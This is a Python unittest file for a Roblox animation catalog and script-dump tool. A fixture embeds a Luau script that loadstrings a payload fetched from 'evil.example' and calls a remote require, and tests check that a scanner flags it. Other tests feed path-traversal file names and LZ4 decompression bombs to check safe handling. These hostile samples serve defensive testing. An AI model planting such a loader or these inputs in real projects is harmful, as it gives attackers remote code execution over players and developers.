import io
import json
import os
import sys
from contextlib import redirect_stdout
import tempfile
import unittest
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))
import anim_catalog as K  # noqa: E402
import anim_rig as R  # noqa: E402
import anim_spec as A  # noqa: E402

_ref = [0]


def cf_xml(rot, pos=(0, 0, 0)):
    names = ["R00", "R01", "R02", "R10", "R11", "R12", "R20", "R21", "R22"]
    flat = [v for row in rot for v in row]
    inner = "".join(f"<{n}>{v!r}</{n}>" for n, v in zip(names, flat))
    return f'<CoordinateFrame name="CFrame"><X>{pos[0]}</X><Y>{pos[1]}</Y><Z>{pos[2]}</Z>{inner}</CoordinateFrame>'


def pose(name, rot, weight=1, style=5, direction=1, children=""):
    _ref[0] += 1
    return (f'<Item class="Pose" referent="RBXP{_ref[0]}"><Properties><string name="Name">{name}</string>'
            f'{cf_xml(rot)}<token name="EasingDirection">{direction}</token><token name="EasingStyle">{style}</token>'
            f'<float name="Weight">{weight}</float></Properties>{children}</Item>')


EULER = {0.0: [0, 0, 0], 0.5: [40, 20, 10], 1.0: [-30, 0, 15]}


def keyframe(t, with_marker=False):
    arm = pose("RightUpperArm", R.euler_to_mat(EULER[t]), style=5, direction=1)
    upper = pose("UpperTorso", R.euler_to_mat([-10 * t, 0, 0]), children=arm)
    lower = pose("LowerTorso", R.euler_to_mat([0, 5 * t, 0]), children=upper)
    root = pose("HumanoidRootPart", R.IDENTITY, weight=0, children=lower)
    marker = ('<Item class="KeyframeMarker" referent="RBXM1"><Properties><string name="Name">HitStart</string>'
              '<string name="Value">strike</string></Properties></Item>') if with_marker else ""
    return (f'<Item class="Keyframe" referent="RBXK{int(t * 10)}"><Properties><string name="Name">Keyframe</string>'
            f'<float name="Time">{t}</float></Properties>{root}{marker}</Item>')


EVIL = 'local f = loadstring(game:HttpGet("http://evil.example/payload.lua")); f(); require(1234567890)'

FIXTURE = f"""<roblox xmlns:xmime="http://www.w3.org/2005/05/xmlmime" version="4">
<Item class="Folder" referent="RBXF"><Properties><string name="Name">Pack</string></Properties>
<Item class="KeyframeSequence" referent="RBXS"><Properties><string name="Name">Punch</string><bool name="Loop">false</bool>
<token name="Priority">2</token></Properties>
{keyframe(0.0)}{keyframe(0.5, True)}{keyframe(1.0)}
</Item>
<Item class="Animation" referent="RBXA"><Properties><string name="Name">Idle</string>
<Content name="AnimationId"><url>rbxassetid://987654321</url></Content></Properties></Item>
<Item class="Script" referent="RBXE"><Properties><string name="Name">Helper</string>
<ProtectedString name="Source"><![CDATA[{EVIL}]]></ProtectedString></Properties></Item>
<Item class="Script" referent="RBXG"><Properties><string name="Name">Fine</string>
<ProtectedString name="Source"><![CDATA[print("hello")]]></ProtectedString></Properties></Item>
</Item></roblox>"""


class RbxdumpSafety(unittest.TestCase):
    """(critic B9) hostile files: script dump paths and LZ4 decompression bombs."""

    def test_script_dump_names_stay_inside(self):
        import rbxdump as rd
        with tempfile.TemporaryDirectory(prefix="dump dir ") as d:
            out = os.path.join(d, "out dir")
            names = ["..\\..\\evil", "C:\\Windows\\x", "../../etc/passwd", "a/b", "CON", "\u00e9t\u00e9 \u2603", ""]
            paths = [rd.script_out_path(out, n) for n in names]
            root = os.path.realpath(out)
            for p in paths:
                self.assertEqual(os.path.dirname(os.path.realpath(p)), root, p)
                self.assertTrue(p.endswith(".luau.txt"))
                open(p, "w", encoding="utf-8").write("x")
            self.assertEqual(len(set(paths)), len(paths))
            self.assertEqual(sorted(os.listdir(d)), ["out dir"])        # nothing escaped
            self.assertFalse(rd.safe_basename("CON").upper().startswith("CON"))

    def test_scripts_cli_writes_utf8_inside(self):
        import rbxdump as rd
        xml = FIXTURE.replace('<string name="Name">Fine</string>', '<string name="Name">..\\..\\Fine \u2603</string>')
        with tempfile.TemporaryDirectory(prefix="dump cli ") as d:
            src = os.path.join(d, "p.rbxmx")
            Path(src).write_text(xml, encoding="utf-8")
            out = os.path.join(d, "scripts out")
            with redirect_stdout(io.StringIO()):
                rd.main([src, "--scripts", out])
            files = os.listdir(out)
            self.assertEqual(len(files), 2, files)
            self.assertEqual(sorted(os.listdir(d)), ["p.rbxmx", "scripts out"])
            for f in files:
                Path(out, f).read_text(encoding="utf-8")

    def test_lz4_bounds(self):
        import rbxdump as rd
        ok = bytes([0x50]) + b"hello"                      # 5 literals
        self.assertEqual(rd.lz4_block(ok, 5), b"hello")
        with self.assertRaises(ValueError):
            rd.lz4_block(ok, 3)                            # more output than declared
        bomb = bytes([0x1F, 0x41, 0x01, 0x00]) + bytes([255]) * 40 + bytes([0])   # 1 literal, then a long match
        with self.assertRaises(ValueError):
            rd.lz4_block(bomb, 64)
        with self.assertRaises(ValueError):
            rd.lz4_block(bytes([0x10, 0x41, 0x05, 0x00]), 10)   # match offset before the start
        with self.assertRaises(ValueError):
            rd.lz4_block(ok, rd.MAX_DECOMPRESSED + 1)

    def test_binary_chunk_size_cap(self):
        import struct
        import rbxdump as rd
        head = b"<roblox!" + b"\x89\xff\x0d\x0a\x1a\x0a" + b"\x00\x00" + struct.pack("<ii", 0, 0) + b"\x00" * 8
        chunk = b"META" + struct.pack("<III", 0, 0xFFFFFFF0, 0)
        with self.assertRaises(ValueError):
            rd.load_binary(head + chunk + b"\x00" * 16)


class Catalog(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls.tmp = tempfile.TemporaryDirectory(prefix="cat dir ")
        cls.path = os.path.join(cls.tmp.name, "pack.rbxmx")
        Path(cls.path).write_text(FIXTURE, encoding="utf-8")
        cls.res = K.extract(cls.path)

    @classmethod
    def tearDownClass(cls):
        cls.tmp.cleanup()

    def test_scan_flags_the_malicious_script_only(self):
        sc = self.res["scan"]
        self.assertEqual(sc["scripts"], 2)
        self.assertEqual(len(sc["suspicious"]), 1)
        sus = sc["suspicious"][0]
        self.assertEqual(sus["name"], "Helper")
        for flag in ("loadstring", "http_url", "remote_require"):
            self.assertIn(flag, sus["flags"])
        self.assertNotIn("evil.example", json.dumps(self.res["sequences"]))  # script text never leaks into specs

    def test_sequence_metadata(self):
        self.assertEqual(len(self.res["sequences"]), 1)
        s = self.res["sequences"][0]
        self.assertEqual(s["name"], "Punch")
        self.assertEqual(s["path_in_file"], "Pack/Punch")
        self.assertAlmostEqual(s["length_s"], 1.0)
        self.assertIn(s["fps_guess"], (24, 30, 60))
        self.assertFalse(s["loop"])
        self.assertEqual(s["priority"], "Action")
        self.assertEqual(s["spec"]["rig"], "R15")
        self.assertEqual(s["parts"], ["LowerTorso", "RightUpperArm", "UpperTorso"])  # HRP container (weight 0) skipped
        self.assertEqual(s["markers"], [{"name": "HitStart", "value": "strike", "f": 30}])

    def test_spec_keys_and_angles_match(self):
        spec = self.res["sequences"][0]["spec"]
        arm = spec["tracks"]["RightUpperArm"]
        self.assertEqual([k["f"] for k in arm], [0, 30, 60])
        for k, t in zip(arm, (0.0, 0.5, 1.0)):
            for got, want in zip(k["r"], EULER[t]):
                self.assertAlmostEqual(got, want, places=2)
            self.assertEqual((k["e"], k["d"]), ("CubicV2", "Out"))
        self.assertAlmostEqual(spec["tracks"]["LowerTorso"][2]["r"][1], 5.0, places=2)
        self.assertEqual(spec["length"], 60)
        self.assertEqual(spec["fps"], 60)
        self.assertEqual(A.schema_check(spec), [])
        self.assertFalse([m for lvl, m in A.lint(spec) if lvl == "error"])

    def test_animation_instances(self):
        an = self.res["animations"]
        self.assertEqual(len(an), 1)
        self.assertEqual(an[0]["asset_id"], 987654321)
        self.assertIn("987654321", an[0]["animation_id"])

    def test_r6_guess(self):
        self.assertEqual(K.guess_rig({"Torso", "Right Arm", "Head"}), "R6")
        self.assertEqual(K.guess_rig({"UpperTorso", "RightHand"}), "R15")

    def test_cli_writes_specs_and_catalog(self):
        out = os.path.join(self.tmp.name, "out dir")
        self.assertEqual(K.main([self.path, "--out", out]), 0)
        self.assertEqual(sorted(os.listdir(out)), ["01_Punch.spec.json", "catalog.json"])
        cat = json.load(open(os.path.join(out, "catalog.json")))
        self.assertEqual(cat["scan"]["suspicious"][0]["name"], "Helper")
        self.assertNotIn("spec", cat["sequences"][0])


if __name__ == "__main__":
    unittest.main()
